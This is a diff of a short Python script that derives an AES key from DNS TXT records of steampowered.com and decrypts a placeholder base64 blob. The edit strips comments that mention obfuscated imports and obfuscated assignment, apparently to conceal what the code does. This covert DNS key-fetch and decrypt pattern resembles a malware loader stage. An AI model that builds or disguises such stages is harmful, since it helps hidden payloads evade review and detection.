@@ -1,4 +1,3 @@
-# Dynamic import statements using obfuscated strings
 dns_resolver = __import__('dns.resolver', globals(), locals(), ['resolver'], 0)
 hashlib = __import__('hashlib', globals(), locals(), [], 0)
 cryptography = __import__('cryptography.hazmat.primitives.ciphers', globals(), locals(), ['Cipher', 'algorithms', 'modes'], 0)
@@ -6,7 +5,7 @@ cryptography_backend = __import__('cryptography.hazmat.backends', globals(), loc
 cryptography_padding = __import__('cryptography.hazmat.primitives', globals(), locals(), ['padding'], 0)
 base64 = __import__('base64', globals(), locals(), [], 0)
 
-# Fetch TXT records
+
 def ftr(d):
     try:
         a = dns_resolver.resolve(d, 'TXT')
@@ -16,7 +15,7 @@ def ftr(d):
         print(f"Err: {e}")
         return []
 
-# Merge strings
+
 def om(rs):
     if not rs:
         return ""
@@ -25,14 +24,12 @@ def om(rs):
     h = len(f) // 2
     return f[:h] + m + f[h:]
 
-# Hash string
 def ho(ms):
     rs = ms[::-1]
     hasher = hashlib.sha256()
     hasher.update(rs.encode('utf-8'))
     return hasher.hexdigest()
 
-# Decrypt data
 def dd(ed, k):
     k = k[:32].ljust(32, '\0').encode()
     iv, ed = ed[:16], ed[16:]
@@ -44,7 +41,7 @@ def dd(ed, k):
     return dd
 
 if __name__ == "__main__":
-    d = "steampowered.com"  # Domain, consider dynamic or obfuscated assignment
+    d = "steampowered.com" 
     ed_b64 = "Your_Base64_Encoded_Encrypted_Data_Here"  # Placeholder
 
     # Process
